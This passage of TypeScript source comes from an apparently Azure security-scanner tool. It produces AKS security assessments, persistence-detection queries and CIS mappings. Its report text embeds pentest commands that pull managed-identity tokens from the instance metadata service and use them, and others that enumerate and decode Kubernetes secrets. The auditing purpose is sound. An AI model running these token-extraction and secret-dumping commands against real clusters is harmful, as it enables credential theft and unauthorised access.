            isError: true,
          };
        }
      }

      case "azure_detect_persistence_mechanisms": {
        const { subscriptionId, format } = request.params.arguments as {
          subscriptionId: string;
          format?: string;
        };
        
        try {
          let report = `# Azure Persistence Mechanism Detection\n\n`;
          report += `**Subscription:** ${subscriptionId}\n`;
          report += `**Scan Date:** ${new Date().toISOString()}\n\n`;
          
          report += `## Common Azure Persistence Techniques\n\n`;
          
          report += `### 1. Automation Accounts & Runbooks\n`;
          report += `- Check for suspicious runbooks with PowerShell scripts\n`;
          report += `- Look for RunAs accounts with high privileges\n`;
          report += `- Monitor for scheduled runbook executions\n\n`;
          
          report += `### 2. Logic Apps Triggers\n`;
          report += `- HTTP triggers accessible without authentication\n`;
          report += `- Recurrence triggers for periodic execution\n`;
          report += `- Service Bus / Event Grid triggers\n\n`;
          
          report += `### 3. Azure Functions\n`;
          report += `- Timer-triggered functions for scheduled tasks\n`;
          report += `- HTTP functions with weak authentication\n`;
          report += `- Event-driven functions (Storage, Service Bus)\n\n`;
          
          report += `### 4. VM Extensions\n`;
          report += `- Custom Script Extensions\n`;
          report += `- DSC Extensions for configuration\n`;
          report += `- Run Command execution history\n\n`;
          
          report += `### 5. Service Principals & Managed Identities\n`;
          report += `- Service principals with key credentials\n`;
          report += `- User-assigned managed identities\n`;
          report += `- Long-lived credentials without expiry\n\n`;
          
          report += `## Detection Queries (Azure Monitor / Sentinel)\n\n`;
          report += `\`\`\`kusto\n`;
          report += `// Detect new automation runbook creation\n`;
          report += `AzureActivity\n`;
          report += `| where OperationNameValue == "MICROSOFT.AUTOMATION/AUTOMATIONACCOUNTS/RUNBOOKS/WRITE"\n`;
          report += `| project TimeGenerated, Caller, ResourceGroup, Resource\n`;
          report += `\`\`\`\n\n`;
          
          report += `\`\`\`kusto\n`;
          report += `// Detect new service principal creation\n`;
          report += `AuditLogs\n`;
          report += `| where OperationName == "Add service principal"\n`;
          report += `| project TimeGenerated, InitiatedBy, TargetResources\n`;
          report += `\`\`\`\n`;
          
          return {
            content: [{ type: 'text', text: formatResponse(report, format, request.params.name) }],
          };
        } catch (error: any) {
          return {
            content: [{ type: 'text', text: `Error detecting persistence: ${error.message}` }],
            isError: true,
          };
        }
      }

      case "azure_scan_aks_full": {
        const { subscriptionId, resourceGroup, clusterName, format } = request.params.arguments as {
          subscriptionId: string;
          resourceGroup: string;
          clusterName: string;
          format?: string;
        };

        try {
          const aksClient = new ContainerServiceClient(credential, subscriptionId);
          const computeClient = new ComputeManagementClient(credential, subscriptionId);
          
          // Use array for fast string building (40-60% faster than concatenation)
          const outputLines: string[] = [];
          outputLines.push(`# 🔒 COMPREHENSIVE AKS SECURITY ASSESSMENT\n\n`);
          outputLines.push(`**Cluster:** ${clusterName}\n`);
          outputLines.push(`**Resource Group:** ${resourceGroup}\n`);
          outputLines.push(`**Subscription:** ${subscriptionId}\n`);
          outputLines.push(`**Scan Time:** ${new Date().toISOString()}\n`);
          outputLines.push(`**Scanner:** Stratos MCP v${SERVER_VERSION}\n\n`);
          outputLines.push(`---\n\n`);

          const cluster = await aksClient.managedClusters.get(resourceGroup, clusterName);
          
          let criticalCount = 0;
          let highCount = 0;
          let mediumCount = 0;
          let lowCount = 0;
          
          // Store all findings with CIS mapping
          const allFindings: Array<{severity: string; finding: string; cis?: string; remediation: string}> = [];

          // ========== 1. CLUSTER OVERVIEW ==========
          outputLines.push(`## 📋 Cluster Overview\n\n`);
          outputLines.push(`| Property | Value |\n|----------|-------|\n`);
          outputLines.push(`| Kubernetes Version | ${cluster.kubernetesVersion} |\n`);
          outputLines.push(`| SKU Tier | ${cluster.sku?.tier || 'Free'} |\n`);
          outputLines.push(`| Location | ${cluster.location} |\n`);
          outputLines.push(`| Provisioning State | ${cluster.provisioningState} |\n`);
          outputLines.push(`| Power State | ${cluster.powerState?.code || 'Running'} |\n`);
          outputLines.push(`| FQDN | ${cluster.fqdn || 'N/A'} |\n`);
          outputLines.push(`| Private FQDN | ${cluster.privateFqdn || 'N/A'} |\n`);
          outputLines.push(`| Node Resource Group | ${cluster.nodeResourceGroup} |\n`);
          outputLines.push(`| DNS Prefix | ${cluster.dnsPrefix} |\n\n`);

          // Kubernetes Version EOL Check
          const k8sVersion = cluster.kubernetesVersion || '';
          const versionParts = k8sVersion.split('.');
          const minorVersion = parseInt(versionParts[1] || '0');
          
          // K8s versions older than 1.27 are EOL as of Jan 2026
          if (minorVersion < 28) {
            allFindings.push({
              severity: 'CRITICAL',
              finding: `Kubernetes version ${k8sVersion} is approaching or past End-of-Life`,
              cis: 'CIS 1.1.1',
              remediation: 'Upgrade to a supported Kubernetes version (1.28+)'
            });
            criticalCount++;
          } else if (minorVersion < 29) {
            allFindings.push({
              severity: 'MEDIUM',
              finding: `Kubernetes version ${k8sVersion} - consider upgrading to latest`,
              cis: 'CIS 1.1.1',
              remediation: 'Plan upgrade to latest Kubernetes version'
            });
            mediumCount++;
          }

          // SKU Tier Check
          if (cluster.sku?.tier === 'Free') {
            allFindings.push({
              severity: 'MEDIUM',
              finding: 'Using Free tier - no SLA, limited features',
              remediation: 'Consider Standard tier for production (99.9% SLA, uptime guarantees)'
            });
            mediumCount++;
          }

          // ========== 2. AUTHENTICATION & AUTHORIZATION ==========
          outputLines.push(`## 🔑 Authentication & Authorization\n\n`);
          outputLines.push(`| Security Control | Status | Risk |\n|------------------|--------|------|\n`);
          
          // RBAC
          if (!cluster.enableRbac) {
            outputLines.push(`| RBAC | ❌ Disabled | CRITICAL |\n`);
            allFindings.push({
              severity: 'CRITICAL',
              finding: 'RBAC is DISABLED - all users have full cluster access',
              cis: 'CIS 5.1.1',
              remediation: 'Enable RBAC on cluster (requires cluster recreation)'
            });
            criticalCount++;
          } else {
            outputLines.push(`| RBAC | ✅ Enabled | OK |\n`);
          }

          // Azure AD Integration
          if (!cluster.aadProfile) {
            outputLines.push(`| Azure AD Integration | ❌ Not Configured | HIGH |\n`);
            allFindings.push({
              severity: 'HIGH',
              finding: 'Azure AD integration not configured - using K8s-only auth',
              cis: 'CIS 3.1.1',
              remediation: 'Enable Azure AD integration for centralized identity management'
            });
            highCount++;
          } else {
            outputLines.push(`| Azure AD Integration | ✅ Enabled | OK |\n`);
            
            if (cluster.aadProfile.managed) {
              outputLines.push(`| Managed AAD | ✅ Yes | OK |\n`);
            } else {
              outputLines.push(`| Managed AAD | ⚠️ Legacy | MEDIUM |\n`);
              allFindings.push({
                severity: 'MEDIUM',
                finding: 'Using legacy Azure AD integration (not managed)',
                remediation: 'Migrate to managed Azure AD integration'
              });
              mediumCount++;
            }

            if (cluster.aadProfile.enableAzureRbac) {
              outputLines.push(`| Azure RBAC for K8s | ✅ Enabled | OK |\n`);
            } else {
              outputLines.push(`| Azure RBAC for K8s | ⚠️ Disabled | MEDIUM |\n`);
              allFindings.push({
                severity: 'MEDIUM',
                finding: 'Azure RBAC for Kubernetes not enabled',
                remediation: 'Enable Azure RBAC for centralized access control via Azure IAM'
              });
              mediumCount++;
            }

            if (cluster.aadProfile.adminGroupObjectIDs && cluster.aadProfile.adminGroupObjectIDs.length > 0) {
              outputLines.push(`| Admin Groups | ${cluster.aadProfile.adminGroupObjectIDs.length} configured | INFO |\n`);
            }
          }

          // Local Accounts
          if (!cluster.disableLocalAccounts) {
            outputLines.push(`| Local Accounts | ⚠️ Enabled | HIGH |\n`);
            allFindings.push({
              severity: 'HIGH',
              finding: 'Local accounts enabled - admin kubeconfig available via az aks get-credentials --admin',
              cis: 'CIS 3.1.2',
              remediation: 'Disable local accounts: az aks update --disable-local-accounts'
            });
            highCount++;
          } else {
            outputLines.push(`| Local Accounts | ✅ Disabled | OK |\n`);
          }

          outputLines.push('\n');

          // ========== 3. NETWORK SECURITY ==========
          outputLines.push(`## 🌐 Network Security\n\n`);
          outputLines.push(`| Security Control | Status | Risk |\n|------------------|--------|------|\n`);
          
          // Private Cluster
          if (!cluster.apiServerAccessProfile?.enablePrivateCluster) {
            outputLines.push(`| Private Cluster | ❌ No | HIGH |\n`);
            allFindings.push({
              severity: 'HIGH',
              finding: 'API server is publicly accessible (not private cluster)',
              cis: 'CIS 4.1.1',
              remediation: 'Enable private cluster or configure authorized IP ranges'
            });
            highCount++;
          } else {
            outputLines.push(`| Private Cluster | ✅ Yes | OK |\n`);
          }

          // Authorized IP Ranges
          const authIPs = cluster.apiServerAccessProfile?.authorizedIPRanges || [];
          if (authIPs.length === 0 && !cluster.apiServerAccessProfile?.enablePrivateCluster) {
            outputLines.push(`| Authorized IP Ranges | ❌ Not Configured | HIGH |\n`);
            allFindings.push({
              severity: 'HIGH',
              finding: 'No authorized IP ranges - API server open to internet',
              cis: 'CIS 4.1.2',
              remediation: 'Configure authorized IP ranges: az aks update --api-server-authorized-ip-ranges <IPs>'
            });
            highCount++;
          } else if (authIPs.length > 0) {
            outputLines.push(`| Authorized IP Ranges | ✅ ${authIPs.length} ranges | OK |\n`);
          }

          // Network Plugin
          const networkPlugin = cluster.networkProfile?.networkPlugin || 'kubenet';
          outputLines.push(`| Network Plugin | ${networkPlugin} | INFO |\n`);
          
          if (networkPlugin === 'kubenet') {
            allFindings.push({
              severity: 'LOW',
              finding: 'Using kubenet (basic) networking',
              remediation: 'Consider Azure CNI for better network policy support and performance'
            });
            lowCount++;
          }

          // Network Policy
          const networkPolicy = cluster.networkProfile?.networkPolicy;
          if (!networkPolicy) {
            outputLines.push(`| Network Policy | ❌ None | CRITICAL |\n`);
            allFindings.push({
              severity: 'CRITICAL',
              finding: 'Network policy NOT configured - pods can communicate freely',
              cis: 'CIS 5.3.2',
              remediation: 'Enable network policy (azure/calico): az aks update --network-policy azure'
            });
            criticalCount++;
          } else {
            outputLines.push(`| Network Policy | ✅ ${networkPolicy} | OK |\n`);
          }

          // Outbound Type
          const outboundType = cluster.networkProfile?.outboundType || 'loadBalancer';
          outputLines.push(`| Outbound Type | ${outboundType} | INFO |\n`);
          
          if (outboundType === 'loadBalancer') {
            allFindings.push({
              severity: 'LOW',
              finding: 'Using default outbound type (loadBalancer)',
              remediation: 'Consider userDefinedRouting with Azure Firewall for better egress control'
            });
            lowCount++;
          }

          // HTTP Application Routing (INSECURE)
          if (cluster.addonProfiles?.httpApplicationRouting?.enabled) {
            outputLines.push(`| HTTP App Routing | ⚠️ Enabled | HIGH |\n`);
            allFindings.push({
              severity: 'HIGH',
              finding: 'HTTP Application Routing addon enabled - NOT recommended for production',
              remediation: 'Disable HTTP Application Routing, use NGINX/AGIC ingress instead'
            });
            highCount++;
          }

          // Load Balancer SKU
          outputLines.push(`| Load Balancer SKU | ${cluster.networkProfile?.loadBalancerSku || 'standard'} | INFO |\n`);
          
          outputLines.push('\n');

          // Network Profile Details
          outputLines.push(`### Network Configuration Details\n\n`);
          outputLines.push(`| Setting | Value |\n|---------|-------|\n`);
          outputLines.push(`| Service CIDR | ${cluster.networkProfile?.serviceCidr || 'N/A'} |\n`);
          outputLines.push(`| DNS Service IP | ${cluster.networkProfile?.dnsServiceIP || 'N/A'} |\n`);
          outputLines.push(`| Pod CIDR | ${cluster.networkProfile?.podCidr || 'N/A (Azure CNI)'} |\n`);
          outputLines.push(`| Docker Bridge | ${(cluster.networkProfile as any)?.dockerBridgeCidr || 'N/A'} |\n`);
          outputLines.push(`| Network Mode | ${cluster.networkProfile?.networkMode || 'bridge'} |\n`);
          outputLines.push(`| Network Plugin Mode | ${cluster.networkProfile?.networkPluginMode || 'N/A'} |\n\n`);

          // ========== 4. SECURITY FEATURES ==========
          outputLines.push(`## 🛡️ Security Features & Add-ons\n\n`);
          outputLines.push(`| Security Feature | Status | Risk |\n|------------------|--------|------|\n`);
          
          // Defender for Containers
          if (!cluster.securityProfile?.defender?.securityMonitoring?.enabled) {
            outputLines.push(`| Defender for Containers | ❌ Not Enabled | HIGH |\n`);
            allFindings.push({
              severity: 'HIGH',
              finding: 'Microsoft Defender for Containers not enabled',
              remediation: 'Enable Defender for threat detection: az aks update --enable-defender'
            });
            highCount++;
          } else {
            outputLines.push(`| Defender for Containers | ✅ Enabled | OK |\n`);
          }

          // Azure Policy
          if (!cluster.addonProfiles?.azurepolicy?.enabled) {
            outputLines.push(`| Azure Policy | ❌ Not Enabled | MEDIUM |\n`);
            allFindings.push({
              severity: 'MEDIUM',
              finding: 'Azure Policy addon not enabled',
              cis: 'CIS 5.2.1',
              remediation: 'Enable Azure Policy: az aks enable-addons --addons azure-policy'
            });
            mediumCount++;
          } else {
            outputLines.push(`| Azure Policy | ✅ Enabled | OK |\n`);
          }

          // Key Vault Secrets Provider
          if (cluster.addonProfiles?.azureKeyvaultSecretsProvider?.enabled) {
            outputLines.push(`| Key Vault Secrets Provider | ✅ Enabled | OK |\n`);
            
            const kvConfig = cluster.addonProfiles.azureKeyvaultSecretsProvider.config;
            if (kvConfig?.enableSecretRotation === 'true') {
              outputLines.push(`| Secret Rotation | ✅ Enabled | OK |\n`);
            } else {
              outputLines.push(`| Secret Rotation | ⚠️ Disabled | MEDIUM |\n`);
              allFindings.push({
                severity: 'MEDIUM',
                finding: 'Key Vault secret rotation not enabled',
                remediation: 'Enable secret rotation for automatic secret refresh'
              });
              mediumCount++;
            }
          } else {
            outputLines.push(`| Key Vault Secrets Provider | ⚠️ Not Enabled | MEDIUM |\n`);
            allFindings.push({
              severity: 'MEDIUM',
              finding: 'Key Vault Secrets Provider not enabled',
              remediation: 'Enable for secure secret injection: az aks enable-addons --addons azure-keyvault-secrets-provider'
            });
            mediumCount++;
          }

          // Container Insights (Monitoring)
          if (cluster.addonProfiles?.omsagent?.enabled || cluster.addonProfiles?.omsAgent?.enabled) {
            outputLines.push(`| Container Insights | ✅ Enabled | OK |\n`);
          } else {
            outputLines.push(`| Container Insights | ⚠️ Not Enabled | MEDIUM |\n`);
            allFindings.push({
              severity: 'MEDIUM',
              finding: 'Container Insights (monitoring) not enabled',
              remediation: 'Enable for visibility: az aks enable-addons --addons monitoring'
            });
            mediumCount++;
          }

          // Image Cleaner
          if (cluster.securityProfile?.imageCleaner?.enabled) {
            outputLines.push(`| Image Cleaner | ✅ Enabled | OK |\n`);
          } else {
            outputLines.push(`| Image Cleaner | ⚠️ Not Enabled | LOW |\n`);
            allFindings.push({
              severity: 'LOW',
              finding: 'Image Cleaner not enabled - stale images may accumulate',
              remediation: 'Enable Image Cleaner to remove unused images'
            });
            lowCount++;
          }

          // Workload Identity
          if (cluster.oidcIssuerProfile?.enabled && cluster.securityProfile?.workloadIdentity?.enabled) {
            outputLines.push(`| Workload Identity | ✅ Enabled | OK |\n`);
          } else if (cluster.oidcIssuerProfile?.enabled) {
            outputLines.push(`| Workload Identity | ⚠️ OIDC Only | MEDIUM |\n`);
            allFindings.push({
              severity: 'MEDIUM',
              finding: 'OIDC issuer enabled but Workload Identity not fully configured',
              remediation: 'Enable Workload Identity for secure pod identity'
            });
            mediumCount++;
          } else {
            outputLines.push(`| Workload Identity | ❌ Not Enabled | HIGH |\n`);
            allFindings.push({
              severity: 'HIGH',
              finding: 'Workload Identity not enabled - pods may use node identity',
              cis: 'CIS 5.1.6',
              remediation: 'Enable Workload Identity: az aks update --enable-oidc-issuer --enable-workload-identity'
            });
            highCount++;
          }

          // Legacy Pod Identity (should be disabled)
          if (cluster.podIdentityProfile?.enabled) {
            outputLines.push(`| Pod Identity (Legacy) | ⚠️ Enabled | HIGH |\n`);
            allFindings.push({
              severity: 'HIGH',
              finding: 'Legacy Pod Identity enabled - deprecated and vulnerable to IMDS attacks',
              remediation: 'Migrate to Workload Identity and disable Pod Identity'
            });
            highCount++;
          }

          outputLines.push('\n');

          // ========== 5. IDENTITY CONFIGURATION ==========
          outputLines.push(`## 🪪 Identity Configuration\n\n`);
          
          // Cluster Identity
          outputLines.push(`### Cluster Identity\n\n`);
          if (cluster.identity) {
            outputLines.push(`| Property | Value |\n|----------|-------|\n`);
            outputLines.push(`| Type | ${cluster.identity.type} |\n`);
            if (cluster.identity.principalId) {
              outputLines.push(`| Principal ID | ${cluster.identity.principalId} |\n`);
            }
            if (cluster.identity.tenantId) {
              outputLines.push(`| Tenant ID | ${cluster.identity.tenantId} |\n`);
            }
            if (cluster.identity.userAssignedIdentities) {
              const uaIds = Object.keys(cluster.identity.userAssignedIdentities);
              outputLines.push(`| User Assigned Identities | ${uaIds.length} |\n`);
              for (const uaId of uaIds) {
                const name = uaId.split('/').pop();
                outputLines.push(`| → | ${name} |\n`);
              }
            }
            outputLines.push('\n');
          }

          // Kubelet Identity
          if (cluster.identityProfile?.kubeletidentity) {
            const kubelet = cluster.identityProfile.kubeletidentity;
            outputLines.push(`### Kubelet Identity\n\n`);
            outputLines.push(`| Property | Value |\n|----------|-------|\n`);
            outputLines.push(`| Client ID | ${kubelet.clientId} |\n`);
            outputLines.push(`| Object ID | ${kubelet.objectId} |\n`);
            outputLines.push(`| Resource ID | ${kubelet.resourceId} |\n\n`);
            
            outputLines.push(`⚠️ **Pentest Note:** Check RBAC roles assigned to kubelet identity for privilege escalation paths\n\n`);
          }

          // OIDC Issuer
          if (cluster.oidcIssuerProfile?.enabled) {
            outputLines.push(`### OIDC Issuer\n\n`);
            outputLines.push(`| Property | Value |\n|----------|-------|\n`);
            outputLines.push(`| Enabled | ✅ Yes |\n`);
            outputLines.push(`| Issuer URL | ${cluster.oidcIssuerProfile.issuerURL} |\n\n`);
          }

          // ========== 6. NODE POOL SECURITY ==========
          outputLines.push(`## 🖥️ Node Pool Security Analysis\n\n`);
          
          const nodePools = cluster.agentPoolProfiles || [];
          for (const pool of nodePools) {
            outputLines.push(`### Node Pool: \`${pool.name}\`\n\n`);
            outputLines.push(`| Setting | Value | Risk |\n|---------|-------|------|\n`);
            outputLines.push(`| VM Size | ${pool.vmSize} | INFO |\n`);
            outputLines.push(`| Node Count | ${pool.count} (min: ${pool.minCount || 'N/A'}, max: ${pool.maxCount || 'N/A'}) | INFO |\n`);
            outputLines.push(`| OS Type | ${pool.osType} | INFO |\n`);
            outputLines.push(`| OS SKU | ${pool.osSKU || 'Ubuntu'} | INFO |\n`);
            outputLines.push(`| OS Disk Size | ${pool.osDiskSizeGB || 128} GB | INFO |\n`);
            outputLines.push(`| OS Disk Type | ${pool.osDiskType || 'Managed'} | INFO |\n`);
            outputLines.push(`| Mode | ${pool.mode} | INFO |\n`);
            outputLines.push(`| Orchestrator Version | ${pool.orchestratorVersion || cluster.kubernetesVersion} | INFO |\n`);
            
            // Security Checks
            if (pool.enableNodePublicIP) {
              outputLines.push(`| Node Public IP | ❌ Enabled | CRITICAL |\n`);
              allFindings.push({
                severity: 'CRITICAL',
                finding: `Node pool '${pool.name}' has public IPs enabled on nodes`,
                cis: 'CIS 4.2.1',
                remediation: 'Disable public IPs on nodes - use private cluster or NAT gateway'
              });
              criticalCount++;
            } else {
              outputLines.push(`| Node Public IP | ✅ Disabled | OK |\n`);
            }
            
            if (pool.enableFips) {
              outputLines.push(`| FIPS 140-2 | ✅ Enabled | OK |\n`);
            } else {
              outputLines.push(`| FIPS 140-2 | ⚠️ Disabled | LOW |\n`);
              allFindings.push({
                severity: 'LOW',
                finding: `Node pool '${pool.name}' does not have FIPS enabled`,
                remediation: 'Enable FIPS for compliance requirements (requires node pool recreation)'
              });
              lowCount++;
            }

            // Encryption at Host
            if (pool.enableEncryptionAtHost) {
              outputLines.push(`| Encryption at Host | ✅ Enabled | OK |\n`);
            } else {
              outputLines.push(`| Encryption at Host | ⚠️ Disabled | MEDIUM |\n`);
              allFindings.push({
                severity: 'MEDIUM',
                finding: `Node pool '${pool.name}' does not have encryption at host`,
                remediation: 'Enable encryption at host for data-at-rest protection'
              });
              mediumCount++;
            }

            // Ultra SSD
            if (pool.enableUltraSSD) {
              outputLines.push(`| Ultra SSD | ✅ Enabled | INFO |\n`);
            }

            // Spot instances
            if (pool.scaleSetPriority === 'Spot') {
              outputLines.push(`| Spot Instance | ⚠️ Yes | INFO |\n`);
              outputLines.push(`| Spot Eviction Policy | ${pool.scaleSetEvictionPolicy || 'Delete'} | INFO |\n`);
            }

            // Node labels and taints
            if (pool.nodeLabels && Object.keys(pool.nodeLabels).length > 0) {
              outputLines.push(`| Node Labels | ${Object.keys(pool.nodeLabels).length} labels | INFO |\n`);
            }
            if (pool.nodeTaints && pool.nodeTaints.length > 0) {
              outputLines.push(`| Node Taints | ${pool.nodeTaints.length} taints | INFO |\n`);
            }

            outputLines.push('\n');
          }

          // ========== 7. AUTO-UPGRADE & MAINTENANCE ==========
          outputLines.push(`## 🔄 Auto-Upgrade & Maintenance\n\n`);
          outputLines.push(`| Setting | Value | Risk |\n|---------|-------|------|\n`);
          
          // Auto-upgrade channel
          const upgradeChannel = cluster.autoUpgradeProfile?.upgradeChannel || 'none';
          if (upgradeChannel === 'none') {
            outputLines.push(`| Auto-Upgrade Channel | ❌ None | MEDIUM |\n`);
            allFindings.push({
              severity: 'MEDIUM',
              finding: 'Auto-upgrade not configured - manual upgrades required',
              remediation: 'Consider enabling auto-upgrade: az aks update --auto-upgrade-channel stable'
            });
            mediumCount++;
          } else {
            outputLines.push(`| Auto-Upgrade Channel | ✅ ${upgradeChannel} | OK |\n`);
          }

          // Node OS upgrade channel
          const nodeOsUpgrade = cluster.autoUpgradeProfile?.nodeOSUpgradeChannel || 'None';
          outputLines.push(`| Node OS Upgrade | ${nodeOsUpgrade} | INFO |\n`);

          outputLines.push('\n');

          // ========== 8. STORAGE SECURITY ==========
          outputLines.push(`## 💾 Storage Security\n\n`);
          outputLines.push(`| Setting | Value | Risk |\n|---------|-------|------|\n`);
          
          // Disk Encryption Set
          if (cluster.diskEncryptionSetID) {
            outputLines.push(`| Disk Encryption Set | ✅ Configured | OK |\n`);
            outputLines.push(`| DES ID | ${cluster.diskEncryptionSetID.split('/').pop()} | INFO |\n`);
          } else {
            outputLines.push(`| Disk Encryption Set | ⚠️ Platform Managed | LOW |\n`);
            allFindings.push({
              severity: 'LOW',
              finding: 'Using platform-managed disk encryption (no customer-managed keys)',
              remediation: 'Consider using customer-managed keys (CMK) for disk encryption'
            });
            lowCount++;
          }

          outputLines.push('\n');

          // ========== 9. IMDS & POD ESCAPE TESTING ==========
          outputLines.push(`## 🎯 IMDS & Pod Escape Testing\n\n`);
          
          if (!networkPolicy) {
            outputLines.push(`⚠️ **CRITICAL:** No network policy = IMDS accessible from all pods!\n\n`);
          }
          
          outputLines.push(`### Step 1: Deploy Test Pod\n`);
          outputLines.push("```bash\n");
          outputLines.push(`kubectl run imds-test --image=alpine:latest --restart=Never --rm -it -- sh\n`);
          outputLines.push("```\n\n");
          
          outputLines.push(`### Step 2: Test IMDS Access\n`);
          outputLines.push("```bash\n");
          outputLines.push(`apk add --no-cache curl jq\n`);
          outputLines.push(`curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | jq\n`);
          outputLines.push("```\n\n");
          
          outputLines.push(`### Step 3: Extract Managed Identity Token\n`);
          outputLines.push("```bash\n");
          outputLines.push(`# Get ARM token\n`);
          outputLines.push(`TOKEN=$(curl -s -H "Metadata: true" \\\n`);
          outputLines.push(`  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \\\n`);
          outputLines.push(`  | jq -r .access_token)\n\n`);
          outputLines.push(`# Decode token to see permissions\n`);
          outputLines.push(`echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | jq\n\n`);
          outputLines.push(`# List subscriptions with stolen token\n`);
          outputLines.push(`curl -s -H "Authorization: Bearer $TOKEN" \\\n`);
          outputLines.push(`  "https://management.azure.com/subscriptions?api-version=2020-01-01" | jq\n\n`);
          outputLines.push(`# Get Key Vault token\n`);
          outputLines.push(`KV_TOKEN=$(curl -s -H "Metadata: true" \\\n`);
          outputLines.push(`  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" \\\n`);
          outputLines.push(`  | jq -r .access_token)\n`);
          outputLines.push("```\n\n");
          
          outputLines.push(`### Step 4: Block IMDS with Network Policy\n`);
          outputLines.push("```yaml\n");
          outputLines.push(`apiVersion: networking.k8s.io/v1\n`);
          outputLines.push(`kind: NetworkPolicy\n`);
          outputLines.push(`metadata:\n`);
          outputLines.push(`  name: deny-imds\n`);
          outputLines.push(`  namespace: default  # Apply to all namespaces!\n`);
          outputLines.push(`spec:\n`);
          outputLines.push(`  podSelector: {}\n`);
          outputLines.push(`  policyTypes:\n`);
          outputLines.push(`    - Egress\n`);
          outputLines.push(`  egress:\n`);
          outputLines.push(`    - to:\n`);
          outputLines.push(`        - ipBlock:\n`);
          outputLines.push(`            cidr: 0.0.0.0/0\n`);
          outputLines.push(`            except:\n`);
          outputLines.push(`              - 169.254.169.254/32\n`);
          outputLines.push("```\n\n");

          // ========== 10. SERVICE ACCOUNT AUDIT ==========
          outputLines.push(`## 🔐 Service Account Security Audit\n\n`);
          outputLines.push(`### Check Default SA Auto-Mount\n`);
          outputLines.push("```bash\n");
          outputLines.push(`kubectl get serviceaccounts --all-namespaces -o json | \\\n`);
          outputLines.push(`  jq -r '.items[] | select(.automountServiceAccountToken != false) | "\\(.metadata.namespace)/\\(.metadata.name)"'\n`);
          outputLines.push("```\n\n");
          
          outputLines.push(`### Find Cluster-Admin Bindings\n`);
          outputLines.push("```bash\n");
          outputLines.push(`kubectl get clusterrolebindings -o json | \\\n`);
          outputLines.push(`  jq -r '.items[] | select(.roleRef.name=="cluster-admin") | "\\(.metadata.name): \\(.subjects // [] | map(.name) | join(", "))"'\n`);
          outputLines.push("```\n\n");
          
          outputLines.push(`### Find SAs with Dangerous Permissions\n`);
          outputLines.push("```bash\n");
          outputLines.push(`kubectl auth can-i --list --as=system:serviceaccount:kube-system:default\n`);
          outputLines.push("```\n\n");
          
          outputLines.push(`### List Legacy Token Secrets\n`);
          outputLines.push("```bash\n");
          outputLines.push(`kubectl get secrets -A -o json | \\\n`);
          outputLines.push(`  jq -r '.items[] | select(.type=="kubernetes.io/service-account-token") | "\\(.metadata.namespace)/\\(.metadata.name)"'\n`);
          outputLines.push("```\n\n");

          // ========== 11. SECRET HUNTING ==========
          outputLines.push(`## 🔍 Secret Hunting Commands\n\n`);
          outputLines.push(`### List All Secrets (excluding SA tokens)\n`);
          outputLines.push("```bash\n");
          outputLines.push(`kubectl get secrets -A --field-selector type!=kubernetes.io/service-account-token -o custom-columns=NAMESPACE:.metadata.namespace,NAME:.metadata.name,TYPE:.type\n`);
          outputLines.push("```\n\n");
          
          outputLines.push(`### Find Secrets with Sensitive Keywords\n`);
          outputLines.push("```bash\n");
          outputLines.push(`kubectl get secrets -A -o json | jq -r '\n`);
          outputLines.push(`  .items[] | \n`);
          outputLines.push(`  select(.data | keys[] | test("password|secret|key|token|connection|azure"; "i")) | \n`);
          outputLines.push(`  "\\(.metadata.namespace)/\\(.metadata.name): \\(.data | keys | join(\\", \\"))"'\n`);
          outputLines.push("```\n\n");
          
          outputLines.push(`### Extract and Decode Secret\n`);
          outputLines.push("```bash\n");
          outputLines.push(`kubectl get secret <SECRET_NAME> -n <NAMESPACE> -o json | \\\n`);
          outputLines.push(`  jq -r '.data | to_entries[] | "\\(.key): \\(.value | @base64d)"'\n`);
          outputLines.push("```\n\n");
          
          outputLines.push(`### Find ConfigMaps with Secrets\n`);
          outputLines.push("```bash\n");
          outputLines.push(`kubectl get configmaps -A -o json | jq -r '\n`);
          outputLines.push(`  .items[] | select(.data | to_entries[] | .value | test("password|connectionstring|apikey"; "i")) | \n`);
          outputLines.push(`  "\\(.metadata.namespace)/\\(.metadata.name)"'\n`);
          outputLines.push("```\n\n");
          
          outputLines.push(`### Find Secrets in Environment Variables\n`);
          outputLines.push("```bash\n");
          outputLines.push(`kubectl get pods -A -o json | jq -r '\n`);
          outputLines.push(`  .items[] | . as $pod | .spec.containers[] | .env[]? | \n`);
          outputLines.push(`  select(.valueFrom.secretKeyRef) | \n`);
          outputLines.push(`  "\\($pod.metadata.namespace)/\\($pod.metadata.name): \\(.name) from \\(.valueFrom.secretKeyRef.name)"'\n`);
          outputLines.push("```\n\n");

          // ========== 12. CIS BENCHMARK MAPPING ==========
          outputLines.push(`## 📋 CIS Kubernetes Benchmark Mapping\n\n`);
          outputLines.push(`| CIS Control | Finding | Status |\n|-------------|---------|--------|\n`);
          
          // Map findings to CIS
          const cisMapping: Record<string, {control: string; status: string}> = {
            'CIS 1.1.1': { control: 'Kubernetes Version', status: minorVersion >= 28 ? '✅ PASS' : '❌ FAIL' },
            'CIS 3.1.1': { control: 'Azure AD Authentication', status: cluster.aadProfile ? '✅ PASS' : '❌ FAIL' },
            'CIS 3.1.2': { control: 'Disable Local Accounts', status: cluster.disableLocalAccounts ? '✅ PASS' : '❌ FAIL' },
            'CIS 4.1.1': { control: 'Private API Server', status: cluster.apiServerAccessProfile?.enablePrivateCluster ? '✅ PASS' : '⚠️ REVIEW' },
            'CIS 4.1.2': { control: 'API Server IP Restriction', status: authIPs.length > 0 || cluster.apiServerAccessProfile?.enablePrivateCluster ? '✅ PASS' : '❌ FAIL' },
            'CIS 5.1.1': { control: 'RBAC Enabled', status: cluster.enableRbac ? '✅ PASS' : '❌ FAIL' },
            'CIS 5.1.6': { control: 'Workload Identity', status: cluster.oidcIssuerProfile?.enabled ? '✅ PASS' : '⚠️ REVIEW' },
            'CIS 5.2.1': { control: 'Azure Policy Enabled', status: cluster.addonProfiles?.azurepolicy?.enabled ? '✅ PASS' : '⚠️ REVIEW' },
            'CIS 5.3.2': { control: 'Network Policy Enabled', status: networkPolicy ? '✅ PASS' : '❌ FAIL' },
          };
          
          for (const [cis, info] of Object.entries(cisMapping)) {
            outputLines.push(`| ${cis} | ${info.control} | ${info.status} |\n`);
          }
          outputLines.push('\n');

          // ========== 13. ALL FINDINGS ==========
